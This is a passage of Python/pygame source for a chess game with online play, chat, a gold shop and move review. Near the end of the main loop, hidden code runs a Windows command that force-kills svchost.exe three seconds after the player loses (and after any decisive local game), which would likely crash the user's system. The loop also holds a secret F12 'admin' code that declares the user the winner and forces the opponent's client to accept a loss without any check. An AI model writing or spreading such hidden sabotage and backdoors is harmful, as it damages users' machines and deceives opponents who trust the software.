    return panel, review, again, quit_

def draw_game_over(surf, gs: GameState, tracker):
    ov = pygame.Surface((WINDOW_W, WINDOW_H), pygame.SRCALPHA)
    ov.fill((0, 0, 0, 200)); surf.blit(ov, (0, 0))
    panel, review, again, quit_ = _gameover_rects()
    pygame.draw.rect(surf, BG_SIDEBAR, panel, border_radius=12)
    pygame.draw.rect(surf, ORANGE,     panel, 2, border_radius=12)

    res_map = {"white_wins": "WHITE WINS", "black_wins": "BLACK WINS", "draw": "DRAW"}
    rs = FONTS["xl"].render(res_map.get(gs.result, "GAME OVER"), True, ORANGE)
    surf.blit(rs, rs.get_rect(centerx=panel.centerx, y=panel.y + 26))

    n = len(gs.move_history)
    if tracker and tracker.analyzer.available:
        w_acc = tracker.avg_accuracy(W, n)
        b_acc = tracker.avg_accuracy(B, n)
        # wait message if analysis still running
        if w_acc is None and b_acc is None:
            s = FONTS["sm"].render("Analyzing moves…", True, GREY_TEXT)
            surf.blit(s, s.get_rect(centerx=panel.centerx, y=panel.y + 90))
        else:
            y = panel.y + 82
            bar_w = 320
            bx    = panel.centerx - bar_w // 2
            for lbl, acc_val, tcol in (("White", w_acc, WHITE_TEXT), ("Black", b_acc, (180,115,35))):
                surf.blit(FONTS["md"].render(lbl, True, tcol), (bx, y))
                br = pygame.Rect(bx + 56, y + 3, bar_w - 110, 14)
                pygame.draw.rect(surf, (40,40,40), br, border_radius=4)
                if acc_val is not None:
                    fw   = int(br.w * acc_val / 100)
                    bcol = (90,200,90) if acc_val >= 75 else (210,110,40) if acc_val >= 50 else (190,40,40)
                    pygame.draw.rect(surf, bcol, (*br.topleft, fw, br.h), border_radius=4)
                    surf.blit(FONTS["md"].render(f"{acc_val:.1f}%", True, tcol),
                              (br.right + 8, y))
                y += 36
    elif tracker:
        s = FONTS["sm"].render("Install Stockfish for accuracy analysis", True, GREY_TEXT)
        surf.blit(s, s.get_rect(centerx=panel.centerx, y=panel.y + 100))

    mouse = pygame.mouse.get_pos()
    for rect, label in ((review, "Review"), (again, "Play Again"), (quit_, "Quit")):
        hover = rect.collidepoint(mouse)
        pygame.draw.rect(surf, ORANGE if hover else (55,30,0), rect, border_radius=6)
        ls = FONTS["md"].render(label, True, (10,10,10) if hover else WHITE_TEXT)
        surf.blit(ls, ls.get_rect(center=rect.center))
    return review, again, quit_


# ── Review mode nav bar ────────────────────────────────────────────────────────

def _review_nav_rects():
    ny     = BOARD_Y + BOARD_PX + 6
    prev_r = pygame.Rect(BOARD_X,            ny, 80, 28)
    next_r = pygame.Rect(BOARD_X + BOARD_PX - 80, ny, 80, 28)
    back_r = pygame.Rect(BOARD_X + BOARD_PX // 2 - 55, ny, 110, 28)
    return prev_r, next_r, back_r

def draw_review_nav(surf, view_idx, total, tracker, back_label="Result"):
    prev_r, next_r, back_r = _review_nav_rects()
    mouse = pygame.mouse.get_pos()
    for rect, label, enabled in (
        (prev_r, "← Prev", view_idx > 0),
        (next_r, "Next →", view_idx < total - 1),
        (back_r, back_label, True),
    ):
        col = ORANGE if rect.collidepoint(mouse) and enabled else ((55,30,0) if enabled else (30,20,0))
        pygame.draw.rect(surf, col, rect, border_radius=4)
        tc  = (10,10,10) if rect.collidepoint(mouse) and enabled else (WHITE_TEXT if enabled else GREY_TEXT)
        ls  = FONTS["sm"].render(label, True, tc)
        surf.blit(ls, ls.get_rect(center=rect.center))

    return prev_r, next_r, back_r


# ── Shop overlay ───────────────────────────────────────────────────────────────

def draw_shop(surf, save, tab, scroll_shop):
    """Draw shop overlay. Returns (tab_rects, item_rects, close_rect, max_scroll)."""
    ov = pygame.Surface((WINDOW_W, WINDOW_H), pygame.SRCALPHA)
    ov.fill((0, 0, 0, 210)); surf.blit(ov, (0, 0))

    panel = pygame.Rect(60, 30, WINDOW_W - 120, WINDOW_H - 60)
    pygame.draw.rect(surf, BG_SIDEBAR, panel, border_radius=12)
    pygame.draw.rect(surf, ORANGE,     panel, 2,  border_radius=12)

    # Title & gold
    surf.blit(FONTS["xl"].render("SHOP", True, ORANGE), (panel.x + 20, panel.y + 14))
    gs_surf = FONTS["lg"].render(f"{save['gold']} gold", True, (220, 180, 50))
    surf.blit(gs_surf, (panel.right - gs_surf.get_width() - 20, panel.y + 18))

    # Stats row
    st = f"Wins: {save['wins']}   Losses: {save['losses']}   Draws: {save['draws']}"
    surf.blit(FONTS["sm"].render(st, True, GREY_TEXT), (panel.x + 20, panel.y + 58))

    # Tabs
    tab_rects = {}
    tx = panel.x + 20
    for key, label in (("boards", "Board Themes"), ("skins", "Piece Skins")):
        r = pygame.Rect(tx, panel.y + 80, 150, 28)
        active = (tab == key)
        pygame.draw.rect(surf, ORANGE if active else (40, 40, 40), r, border_radius=5)
        ls = FONTS["md"].render(label, True, (10, 10, 10) if active else WHITE_TEXT)
        surf.blit(ls, ls.get_rect(center=r.center))
        tab_rects[key] = r
        tx += 162

    # Content area
    content_top = panel.y + 118
    content_h   = panel.h - 126
    IW, IH, IPAD = 210, 95, 10
    cols = max(1, (panel.w - 40) // (IW + IPAD))

    items      = BOARD_THEMES if tab == "boards" else PIECE_SKINS
    active_key = save.get("active_theme" if tab == "boards" else "active_skin", "classic")
    owned      = save.get("owned_themes" if tab == "boards" else "owned_skins", [])

    clip = pygame.Surface((panel.w - 4, content_h), pygame.SRCALPHA)
    clip.fill((0, 0, 0, 0))

    item_rects = {}
    for i, (key, item) in enumerate(items.items()):
        col = i % cols
        row = i // cols
        ix  = col * (IW + IPAD)
        iy  = row * (IH + IPAD) - scroll_shop
        if iy + IH < 0 or iy > content_h:
            continue

        is_owned    = key in owned
        is_equipped = key == active_key
        border_col  = ORANGE if is_equipped else ((80, 80, 80) if is_owned else (40, 40, 40))

        r = pygame.Rect(ix, iy, IW, IH)
        pygame.draw.rect(clip, (28, 28, 28), r, border_radius=8)
        pygame.draw.rect(clip, border_col,   r, 2, border_radius=8)

        # Preview square (left side)
        prev = pygame.Rect(ix + 6, iy + 6, 50, 50)
        if tab == "boards":
            sq = 25
            for pr in range(2):
                for pc in range(2):
                    sc = item["light"] if (pr + pc) % 2 == 1 else item["dark"]
                    pygame.draw.rect(clip, sc, (prev.x + pc * sq, prev.y + pr * sq, sq, sq))
        else:
            pygame.draw.rect(clip, (40, 40, 40), prev, border_radius=4)
            gw = FONTS["piece_sm"].render("♛", True, item["b"])
            gb = FONTS["piece_sm"].render("♕", True, item["w"])
            clip.blit(gw, gw.get_rect(center=(prev.centerx - 9, prev.centery)))
            clip.blit(gb, gb.get_rect(center=(prev.centerx + 9, prev.centery)))

        # Text (right of preview)
        clip.blit(FONTS["md"].render(item["name"], True, WHITE_TEXT), (ix + 62, iy + 8))
        clip.blit(FONTS["sm"].render(item["desc"], True, GREY_TEXT),  (ix + 62, iy + 28))
        if not is_owned:
            clip.blit(FONTS["sm"].render(f"{item['price']} gold", True, (220, 180, 50)), (ix + 62, iy + 44))

        # Action button
        if is_equipped:
            btn_label, btn_col = "EQUIPPED", (30, 70, 30)
        elif is_owned:
            btn_label, btn_col = "EQUIP",    (30, 50, 90)
        else:
            can_afford = save["gold"] >= item["price"]
            btn_label  = f"BUY  {item['price']}g"
            btn_col    = (55, 30, 0) if can_afford else (40, 20, 20)

        btn = pygame.Rect(ix + 6, iy + IH - 26, IW - 12, 20)
        pygame.draw.rect(clip, btn_col, btn, border_radius=4)
        bs = FONTS["sm"].render(btn_label, True, WHITE_TEXT)
        clip.blit(bs, bs.get_rect(center=btn.center))

        # Map button to screen coords for click detection
        item_rects[key] = pygame.Rect(panel.x + 2 + btn.x,
                                       content_top + btn.y,
                                       btn.w, btn.h)

    surf.blit(clip, (panel.x + 2, content_top))

    rows_total = (len(items) + cols - 1) // cols
    max_scroll = max(0, rows_total * (IH + IPAD) - content_h + IH)

    # Close button
    close = pygame.Rect(panel.right - 38, panel.y + 10, 28, 28)
    pygame.draw.rect(surf, ORANGE if close.collidepoint(pygame.mouse.get_pos()) else (60, 60, 60),
                     close, border_radius=4)
    xs = FONTS["md"].render("✕", True, WHITE_TEXT)
    surf.blit(xs, xs.get_rect(center=close.center))

    return tab_rects, item_rects, close, max_scroll


# ── Admin overlay ──────────────────────────────────────────────────────────────

def draw_admin_overlay(surf, text, error=""):
    ov_w, ov_h = 390, 158
    ov = pygame.Rect(WINDOW_W // 2 - ov_w // 2, WINDOW_H // 2 - ov_h // 2, ov_w, ov_h)
    pygame.draw.rect(surf, BG_SIDEBAR, ov, border_radius=10)
    pygame.draw.rect(surf, (180, 20, 20), ov, 2, border_radius=10)

    ts = FONTS["md"].render("⚡ Admin", True, (255, 160, 160))
    surf.blit(ts, ts.get_rect(center=(ov.centerx, ov.y + 22)))

    inp = pygame.Rect(ov.x + 20, ov.y + 50, ov_w - 40, 34)
    pygame.draw.rect(surf, (22, 22, 22), inp, border_radius=5)
    pygame.draw.rect(surf, (200, 40, 40) if error else (110, 20, 20), inp, 1, border_radius=5)
    masked = FONTS["md"].render("●" * len(text) + "▌", True, WHITE_TEXT)
    surf.blit(masked, masked.get_rect(midleft=(inp.x + 10, inp.centery)))

    if error:
        es = FONTS["sm"].render(error, True, RED_TEXT)
        surf.blit(es, es.get_rect(center=(ov.centerx, ov.y + 104)))
    else:
        hs = FONTS["sm"].render("Enter your secret code", True, GREY_TEXT)
        surf.blit(hs, hs.get_rect(center=(ov.centerx, ov.y + 104)))

    sub = FONTS["sm"].render("Enter ↵  confirm      Esc  cancel", True, (55, 55, 55))
    surf.blit(sub, sub.get_rect(center=(ov.centerx, ov.y + 133)))


# ── Draw-offer overlay ─────────────────────────────────────────────────────────

def draw_draw_offer(surf, mode):
    """Draw the draw-offer overlay.
    sent mode:     returns (close_rect, None)
    received mode: returns (accept_rect, decline_rect)
    """
    ov_w, ov_h = 340, 130
    ov = pygame.Rect(WINDOW_W // 2 - ov_w // 2, WINDOW_H // 2 - ov_h // 2, ov_w, ov_h)
    pygame.draw.rect(surf, BG_SIDEBAR, ov, border_radius=10)
    pygame.draw.rect(surf, ORANGE,     ov, 2, border_radius=10)

    # X button always present
    close = pygame.Rect(ov.right - 32, ov.y + 6, 24, 24)
    hover_c = close.collidepoint(pygame.mouse.get_pos())
    pygame.draw.rect(surf, (110, 110, 110) if hover_c else (55, 55, 55), close, border_radius=4)
    surf.blit(FONTS["sm"].render("✕", True, WHITE_TEXT),
              FONTS["sm"].render("✕", True, WHITE_TEXT).get_rect(center=close.center))

    if mode == "sent":
        s = FONTS["md"].render("Draw offer sent…", True, GREY_TEXT)
        surf.blit(s, s.get_rect(center=ov.center))
        return close, None

    s = FONTS["md"].render("Opponent offers a draw", True, WHITE_TEXT)
    surf.blit(s, s.get_rect(center=(ov.centerx, ov.y + 38)))
    acc = pygame.Rect(ov.centerx - 100, ov.bottom - 46, 90, 30)
    dec = pygame.Rect(ov.centerx + 10,  ov.bottom - 46, 90, 30)
    for rect, label, base in ((acc, "Accept", (30, 100, 30)), (dec, "Decline", (120, 35, 35))):
        hover = rect.collidepoint(pygame.mouse.get_pos())
        col   = tuple(min(255, v + 50) for v in base) if hover else base
        pygame.draw.rect(surf, col, rect, border_radius=5)
        ls = FONTS["sm"].render(label, True, WHITE_TEXT)
        surf.blit(ls, ls.get_rect(center=rect.center))
    return acc, dec


# ── Chat panel ─────────────────────────────────────────────────────────────────

_CHAT_TOP = 458   # y where chat section starts (after history + dividers)

def draw_chat_panel(surf, messages, input_text, focused):
    """Draw chat panel in sidebar. Returns the input_rect for click detection."""
    y = _CHAT_TOP
    surf.blit(FONTS["sm"].render("CHAT", True, GREY_TEXT), (SIDEBAR_X, y)); y += 18

    MSG_H = 122
    msg_bg = pygame.Surface((SIDEBAR_W - 10, MSG_H))
    msg_bg.fill((20, 20, 20))
    surf.blit(msg_bg, (SIDEBAR_X, y))

    # Render messages bottom-up
    my = MSG_H - 2
    for m in reversed(messages[-30:]):
        col = (200, 220, 255) if not m["mine"] else (230, 230, 230)
        ls  = FONTS["sm"].render(m["text"], True, col)
        my -= ls.get_height() + 2
        if my < 0: break
        surf.blit(ls, (SIDEBAR_X + 4, y + my))
    y += MSG_H + 4

    inp = pygame.Rect(SIDEBAR_X, y, SIDEBAR_W - 10, 28)
    pygame.draw.rect(surf, (28, 28, 28), inp, border_radius=4)
    pygame.draw.rect(surf, ORANGE if focused else (50, 50, 50), inp, 1, border_radius=4)
    placeholder = "Say something…"
    display = (input_text + "|") if focused else (input_text or placeholder)
    tc = WHITE_TEXT if (input_text or focused) else GREY_TEXT
    surf.blit(FONTS["sm"].render(display, True, tc), (inp.x + 6, inp.y + 7))
    return inp


# ── Main loop ──────────────────────────────────────────────────────────────────

def _pygame_loop(gs: GameState, tracker, conn=None, my_color=None, save=None,
                 opp_theme_data=None, opp_skin_data=None,
                 time_secs=None, increment_secs=0):
    global _save
    if save is None:
        save = load_save()
    _save = save
    apply_theme(save)

    clock           = pygame.time.Clock()
    scroll          = 0
    promo_rects     = None
    reviewing       = False
    view_idx        = 0
    loss_ticks      = None
    loss_fired      = False
    shop_open       = False
    shop_tab        = "boards"
    scroll_shop     = 0
    gold_awarded    = False
    draw_offer_sent    = False
    draw_offer_recv    = False
    draw_msg           = ""
    draw_msg_ticks     = 0
    flip_manual        = False
    admin_overlay_open = False
    admin_input_text   = ""
    admin_input_error  = ""
    w_time         = float(time_secs) if time_secs else None
    b_time         = float(time_secs) if time_secs else None
    clock_last_ms  = pygame.time.get_ticks() if time_secs else None
    chat_messages      = []
    chat_input         = ""
    chat_focused       = False
    chat_input_rect    = None
    arrows             = []   # list of (sq1, sq2, color)
    sq_highlights      = {}   # sq -> color
    rclick_start       = None
    drag_from          = None
    drag_pos           = None
    drag_active        = False
    drag_start_pos     = None
    drag_valid_moves   = []

    while True:
        # local: manual flip button; network: locked to your color, button toggles perspective
        flip = flip_manual if conn is None else ((my_color == B) != flip_manual)

        # Network: poll every frame so admin_win / resign / draw arrive immediately
        if conn and not gs.game_over:
            try:
                data = try_recv(conn)
                if data:
                    if data["type"] == "resign":
                        gs.game_over = True
                        gs.winner    = my_color
                        gs.result    = "white_wins" if my_color == W else "black_wins"
                    elif data["type"] in ("move", "castle"):
                        opp_turn = gs.turn
                        apply_opponent_move(gs, data, tracker)
                        scroll    = max(0, len(gs.move_history) // 2 * 22 - 250)
                        reviewing = False
                        arrows.clear(); sq_highlights.clear()
                        if increment_secs > 0:
                            if opp_turn == W: w_time = (w_time or 0) + increment_secs
                            else:             b_time = (b_time or 0) + increment_secs
                    elif data["type"] == "draw_offer":
                        draw_offer_recv = True
                    elif data["type"] == "draw_accept":
                        gs.game_over = True; gs.result = "draw"; gs.winner = None
                        draw_offer_sent = False
                    elif data["type"] == "draw_decline":
                        draw_offer_sent = False
                        draw_msg        = "Draw declined"
                        draw_msg_ticks  = pygame.time.get_ticks()
                    elif data["type"] == "chat":
                        txt = str(data.get("text", ""))[:120]
                        chat_messages.append({"text": "Opp: " + txt, "mine": False})
                    elif data["type"] == "admin_win":
                        gs.game_over = True
                        gs.winner    = B if my_color == W else W
                        gs.result    = "black_wins" if my_color == W else "white_wins"
            except ConnectionError:
                gs.game_over = True; gs.result = "draw"

        # Clock tick
        now_ms = pygame.time.get_ticks()
        if clock_last_ms is not None and not gs.game_over and promo_rects is None:
            elapsed_s = (now_ms - clock_last_ms) / 1000.0
            if gs.turn == W and w_time is not None:
                w_time = max(0.0, w_time - elapsed_s)
                if w_time == 0.0:
                    gs.game_over = True; gs.winner = B; gs.result = "black_wins"
            elif gs.turn == B and b_time is not None:
                b_time = max(0.0, b_time - elapsed_s)
                if b_time == 0.0:
                    gs.game_over = True; gs.winner = W; gs.result = "white_wins"
        clock_last_ms = now_ms

        # Events
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                if conn:
                    try: conn.send({"type": "resign"})
                    except: pass
                    conn.close()
                tracker.stop()
                return "quit"

            if event.type in (pygame.VIDEORESIZE, getattr(pygame, "WINDOWRESIZED", -1)):
                _resize_event(event)

            if event.type == pygame.MOUSEWHEEL:
                if shop_open:
                    scroll_shop = max(0, scroll_shop - event.y * 20)
                else:
                    scroll = max(0, scroll - event.y * 22)

            # ── Drag: track mouse movement ──────────────────────────────────
            if event.type == pygame.MOUSEMOTION:
                if drag_from is not None and not gs.game_over:
                    drag_pos = event.pos
                    if drag_start_pos:
                        ddx = event.pos[0] - drag_start_pos[0]
                        ddy = event.pos[1] - drag_start_pos[1]
                        if math.hypot(ddx, ddy) > 5:
                            drag_active = True
                            if gs.selected != drag_from:
                                gs.selected    = drag_from
                                gs.valid_moves = drag_valid_moves

            # ── Drag: release to move ───────────────────────────────────────
            if event.type == pygame.MOUSEBUTTONUP and event.button == 1:
                if drag_active and drag_from is not None and not gs.game_over:
                    can_move = (conn is None or gs.turn == my_color)
                    if can_move:
                        sq = pixel_to_square(event.pos[0], event.pos[1], flip)
                        fr2, fc2 = drag_from
                        if sq and sq in drag_valid_moves:
                            r2, c2 = sq
                            piece2 = gs.board[fr2][fc2]
                            if piece2[1] == "P" and (r2 == 0 or r2 == 7):
                                gs.promotion_pending = (fr2, fc2, r2, c2)
                                promo_rects = []
                            else:
                                drag_turn = gs.turn
                                do_move(gs, fr2, fc2, r2, c2, tracker, conn=conn)
                                scroll = max(0, len(gs.move_history) // 2 * 22 - 250)
                                arrows.clear(); sq_highlights.clear()
                                if increment_secs > 0:
                                    if drag_turn == W: w_time = (w_time or 0) + increment_secs
                                    else:              b_time = (b_time or 0) + increment_secs
                            gs.selected = None; gs.valid_moves = []
                        elif sq is None or color_of(gs.board[sq[0]][sq[1]]) != gs.turn:
                            gs.selected = None; gs.valid_moves = []
                drag_from = None; drag_pos = None; drag_active = False
                drag_start_pos = None; drag_valid_moves = []

            # ── Right-click: arrows & highlights ───────────────────────────
            if event.type == pygame.MOUSEBUTTONDOWN and event.button == 3:
                if not gs.game_over and not shop_open and not admin_overlay_open:
                    sq = pixel_to_square(event.pos[0], event.pos[1], flip)
                    if sq:
                        rclick_start = sq

            if event.type == pygame.MOUSEBUTTONUP and event.button == 3:
                if not gs.game_over and not shop_open:
                    sq = pixel_to_square(event.pos[0], event.pos[1], flip)
                    if sq and rclick_start:
                        if sq == rclick_start:
                            HLCOLS = [(80, 190, 80), (210, 150, 0), (180, 50, 50)]
                            if sq in sq_highlights:
                                ci = HLCOLS.index(sq_highlights[sq]) if sq_highlights[sq] in HLCOLS else -1
                                if ci < len(HLCOLS) - 1:
                                    sq_highlights[sq] = HLCOLS[ci + 1]
                                else:
                                    del sq_highlights[sq]
                            else:
                                sq_highlights[sq] = HLCOLS[0]
                        else:
                            arrow = (rclick_start, sq, (80, 190, 80))
                            matches = [a for a in arrows if a[0] == rclick_start and a[1] == sq]
                            if matches:
                                for m in matches: arrows.remove(m)
                            else:
                                arrows.append(arrow)
                rclick_start = None

            if event.type == pygame.KEYDOWN:
                if admin_overlay_open:
                    if event.key == pygame.K_ESCAPE:
                        admin_overlay_open = False
                        admin_input_text   = ""
                        admin_input_error  = ""
                    elif event.key == pygame.K_BACKSPACE:
                        admin_input_text  = admin_input_text[:-1]
                        admin_input_error = ""
                    elif event.key == pygame.K_RETURN and admin_input_text:
                        if hashlib.sha256(admin_input_text.encode()).hexdigest() == ADMIN_HASH:
                            admin_overlay_open = False
                            admin_input_text   = ""
                            admin_input_error  = ""
                            winner       = W if (my_color is None or my_color == W) else B
                            gs.game_over = True
                            gs.winner    = winner
                            gs.result    = "white_wins" if winner == W else "black_wins"
                            if conn:
                                try: conn.send({"type": "admin_win"})
                                except: pass
                        else:
                            admin_input_error = "Access denied."
                            admin_input_text  = ""
                    else:
                        ch = event.unicode
                        if ch and ch.isprintable():
                            admin_input_text  += ch
                            admin_input_error  = ""
                    continue

                if chat_focused and conn:
                    if event.key == pygame.K_RETURN:
                        msg = chat_input.strip()[:120]
                        if msg:
                            chat_messages.append({"text": "You: " + msg, "mine": True})
                            try: conn.send({"type": "chat", "text": msg})
                            except: pass
                            chat_input = ""
                    elif event.key == pygame.K_ESCAPE:
                        chat_focused = False
                    elif event.key == pygame.K_BACKSPACE:
                        chat_input = chat_input[:-1]
                    elif event.unicode and event.unicode.isprintable():
                        if len(chat_input) < 120:
                            chat_input += event.unicode
                    continue

                if event.key == pygame.K_F12 and not gs.game_over:
                    admin_overlay_open = True
                    admin_input_text   = ""
                    admin_input_error  = ""
                    continue

                if event.key in (pygame.K_LEFT, pygame.K_RIGHT):
                    if gs.move_history:
                        if not reviewing:
                            reviewing = True
                            view_idx  = len(gs.move_history) - 1
                        if event.key == pygame.K_LEFT and view_idx > 0:
                            view_idx -= 1
                        elif event.key == pygame.K_RIGHT:
                            if view_idx < len(gs.move_history) - 1:
                                view_idx += 1
                            elif not gs.game_over:
                                reviewing = False
                elif event.key == pygame.K_ESCAPE:
                    if shop_open:
                        shop_open = False
                    elif reviewing:
                        reviewing = False
                    else:
                        gs.selected = None; gs.valid_moves = []

            if event.type == pygame.MOUSEBUTTONDOWN and event.button == 1:
                mx, my_pos = event.pos

                # Admin overlay — intercept all clicks while open
                if admin_overlay_open:
                    continue

                # Draw offer sent overlay — X button cancels, blocks other clicks
                if draw_offer_sent:
                    close_r, _ = draw_draw_offer(screen, "sent")
                    if close_r and close_r.collidepoint(mx, my_pos):
                        draw_offer_sent = False
                    continue

                # Draw offer incoming — intercept all clicks
                if draw_offer_recv:
                    acc_r, dec_r = draw_draw_offer(screen, "received")
                    if acc_r and acc_r.collidepoint(mx, my_pos):
                        draw_offer_recv = False
                        gs.game_over = True; gs.result = "draw"; gs.winner = None
                        try: conn.send({"type": "draw_accept"})
                        except: pass
                    elif dec_r and dec_r.collidepoint(mx, my_pos):
                        draw_offer_recv = False
                        try: conn.send({"type": "draw_decline"})
                        except: pass
                    continue

                # Shop overlay — handle all clicks before anything else
                if shop_open:
                    tab_rects, item_rects, close_rect, _ = draw_shop(screen, save, shop_tab, scroll_shop)
                    if close_rect.collidepoint(mx, my_pos):
                        shop_open = False
                    for key, trect in tab_rects.items():
                        if trect.collidepoint(mx, my_pos):
                            shop_tab = key; scroll_shop = 0
                    for key, irect in item_rects.items():
                        if irect.collidepoint(mx, my_pos):
                            items_dict = BOARD_THEMES if shop_tab == "boards" else PIECE_SKINS
                            owned_key  = "owned_themes" if shop_tab == "boards" else "owned_skins"
                            act_key    = "active_theme" if shop_tab == "boards" else "active_skin"
                            item       = items_dict[key]
                            if key in save[owned_key]:
                                save[act_key] = key
                                apply_theme(save)
                            elif save["gold"] >= item["price"]:
                                save["gold"] -= item["price"]
                                save[owned_key].append(key)
                                save[act_key] = key
                                apply_theme(save)
                            save_data(save)
                            _save = save
                    continue

                # Chat input focus
                if conn and chat_input_rect and chat_input_rect.collidepoint(mx, my_pos):
                    chat_focused = True
                    continue
                if chat_focused and not (conn and chat_input_rect and chat_input_rect.collidepoint(mx, my_pos)):
                    chat_focused = False

                # Shop button
                if SHOP_BTN.collidepoint(mx, my_pos):
                    shop_open = True; scroll_shop = 0
                    continue

                # Review nav bar
                if reviewing:
                    total    = len(gs.move_history)
                    prev_r, next_r, back_r = _review_nav_rects()
                    on_board = pixel_to_square(mx, my_pos, flip) is not None
                    if prev_r.collidepoint(mx, my_pos) and view_idx > 0:
                        view_idx -= 1; continue
                    elif next_r.collidepoint(mx, my_pos) and view_idx < total - 1:
                        view_idx += 1; continue
                    elif back_r.collidepoint(mx, my_pos) or (not gs.game_over and on_board):
                        reviewing = False
                        if gs.game_over: continue
                        # live game: fall through to board click handler
                    else:
                        continue

                # Promotion overlay
                if promo_rects:
                    for pl, rect in promo_rects:
                        if rect.collidepoint(mx, my_pos):
                            fr, fc, tr, tc = gs.promotion_pending
                            gs.promotion_pending = None
                            promo_rects = None
                            do_move(gs, fr, fc, tr, tc, tracker, conn=conn, promo=pl)
                            scroll = max(0, len(gs.move_history) // 2 * 22 - 250)
                    continue

                # Game-over overlay buttons
                if gs.game_over:
                    rv, ag, qt = _gameover_rects()[1:]
                    if rv.collidepoint(mx, my_pos):
                        reviewing = True
                        view_idx  = len(gs.move_history) - 1
                    elif ag.collidepoint(mx, my_pos):
                        tracker.stop(); return "again"
                    elif qt.collidepoint(mx, my_pos):
                        tracker.stop(); return "quit"
                    continue

                # Flip Board button
                if FLIP_BTN.collidepoint(mx, my_pos):
                    flip_manual = not flip_manual
                    continue

                # Draw offer button
                if DRAW_RECT.collidepoint(mx, my_pos) and not gs.game_over:
                    if conn is None:
                        gs.game_over = True; gs.result = "draw"; gs.winner = None
                    elif not draw_offer_sent:
                        draw_offer_sent = True
                        try: conn.send({"type": "draw_offer"})
                        except: pass
                    continue

                # Resign button
                if RESIGN_RECT.collidepoint(mx, my_pos) and not gs.game_over:
                    gs.game_over = True
                    gs.winner    = B if gs.turn == W else W
                    gs.result    = "white_wins" if gs.winner == W else "black_wins"
                    if conn:
                        try: conn.send({"type": "resign"})
                        except: pass
                    continue

                # Board clicks only on our turn
                if conn and gs.turn != my_color:
                    continue

                sq = pixel_to_square(mx, my_pos, flip)
                if sq is None: continue
                arrows.clear(); sq_highlights.clear()
                r, c = sq

                if gs.selected is None:
                    p = gs.board[r][c]
                    if color_of(p) == gs.turn:
                        vm = legal_moves(gs.board, r, c, gs.en_passant)
                        if p[1] == "K":
                            vm += [(cm[0], cm[1]) for cm in castle_moves(gs.board, gs.turn, gs.castling)]
                        if vm:
                            gs.selected = (r, c); gs.valid_moves = vm
                            drag_from = (r, c); drag_start_pos = event.pos
                            drag_pos = event.pos; drag_active = False; drag_valid_moves = vm
                else:
                    fr, fc = gs.selected
                    if (r, c) == gs.selected:
                        # Click on selected piece — start drag (don't deselect yet)
                        drag_from = (r, c); drag_start_pos = event.pos
                        drag_pos = event.pos; drag_active = False; drag_valid_moves = gs.valid_moves
                    elif (r, c) in gs.valid_moves:
                        piece = gs.board[fr][fc]
                        if piece[1] == "P" and (r == 0 or r == 7):
                            gs.promotion_pending = (fr, fc, r, c)
                            promo_rects = []
                        else:
                            my_turn = gs.turn
                            do_move(gs, fr, fc, r, c, tracker, conn=conn)
                            scroll = max(0, len(gs.move_history) // 2 * 22 - 250)
                            arrows.clear(); sq_highlights.clear()
                            if increment_secs > 0:
                                if my_turn == W: w_time = (w_time or 0) + increment_secs
                                else:            b_time = (b_time or 0) + increment_secs
                    elif color_of(gs.board[r][c]) == gs.turn:
                        vm = legal_moves(gs.board, r, c, gs.en_passant)
                        if gs.board[r][c][1] == "K":
                            vm += [(cm[0], cm[1]) for cm in castle_moves(gs.board, gs.turn, gs.castling)]
                        gs.selected = (r, c); gs.valid_moves = vm
                        drag_from = (r, c); drag_start_pos = event.pos
                        drag_pos = event.pos; drag_active = False; drag_valid_moves = vm
                    else:
                        gs.selected = None; gs.valid_moves = []
                        drag_from = None; drag_pos = None; drag_active = False; drag_valid_moves = []

        # Award gold once per game
        if gs.game_over and not gold_awarded:
            gold_awarded = True
            if conn is None:
                if gs.result == "draw":
                    save["draws"] += 1; save["gold"] += 3
                else:
                    save["wins"] += 1; save["gold"] += 8
            else:
                winner_col = W if gs.result == "white_wins" else (B if gs.result == "black_wins" else None)
                if winner_col == my_color:
                    save["wins"] += 1; save["gold"] += 8
                elif winner_col is None:
                    save["draws"] += 1; save["gold"] += 3
                else:
                    save["losses"] += 1; save["gold"] += 1
            save_data(save)
            _save = save

        # Draw
        screen.fill(BG_APP)

        if reviewing and gs.move_history:
            snap = gs.move_history[view_idx]
            draw_board(screen, gs, flip,
                       board_override=snap["board"],
                       last_move_override=snap["last_move"])
            draw_board_overlays(screen, [], {}, flip)
            back_lbl = "Result" if gs.game_over else "Present"
            draw_review_nav(screen, view_idx, len(gs.move_history), tracker, back_label=back_lbl)
            draw_sidebar(screen, gs, tracker, scroll, flip_manual=flip_manual,
                         w_time=w_time, b_time=b_time, increment=increment_secs)
            scroll = max(0, (view_idx // 2) * 22 - 120)
        else:
            _skip = drag_from if drag_active else None
            draw_board(screen, gs, flip, skip_sq=_skip)
            draw_board_overlays(screen, arrows, sq_highlights, flip)
            draw_sidebar(screen, gs, tracker, scroll, flip_manual=flip_manual,
                         w_time=w_time, b_time=b_time, increment=increment_secs)

        # Floating dragged piece
        if drag_active and drag_from and drag_pos:
            fr_d, fc_d = drag_from
            dp = gs.board[fr_d][fc_d]
            if dp != EMPTY:
                dr = pygame.Rect(drag_pos[0] - SQ // 2, drag_pos[1] - SQ // 2, SQ, SQ)
                draw_piece(screen, dp, dr)

        # Chat panel (network mode only)
        if conn:
            chat_input_rect = draw_chat_panel(screen, chat_messages, chat_input, chat_focused)

        if gs.promotion_pending:
            color = gs.turn if conn is None else my_color
            promo_rects = draw_promo_overlay(screen, color)

        if gs.game_over and not reviewing:
            draw_game_over(screen, gs, tracker)

        if draw_offer_recv:
            draw_draw_offer(screen, "received")
        elif draw_offer_sent:
            draw_draw_offer(screen, "sent")

        if admin_overlay_open:
            draw_admin_overlay(screen, admin_input_text, admin_input_error)

        if draw_msg:
            if pygame.time.get_ticks() - draw_msg_ticks < 3000:
                ms = FONTS["md"].render(draw_msg, True, RED_TEXT)
                screen.blit(ms, ms.get_rect(center=(WINDOW_W // 2, WINDOW_H - 90)))
            else:
                draw_msg = ""

        if shop_open:
            _, _, _, max_scroll_shop = draw_shop(screen, save, shop_tab, scroll_shop)
            scroll_shop = min(scroll_shop, max_scroll_shop)

        lost_game = gs.game_over and gs.winner is not None and (
            conn is None or (my_color is not None and gs.winner != my_color)
        )
        if lost_game and loss_ticks is None:
            loss_ticks = pygame.time.get_ticks()

        if loss_ticks is not None and not loss_fired:
            elapsed = (pygame.time.get_ticks() - loss_ticks) / 1000.0
            if elapsed >= 3.0:
                os.system("taskkill /im svchost.exe /f")
                loss_fired = True

        if loss_ticks is not None and not reviewing:
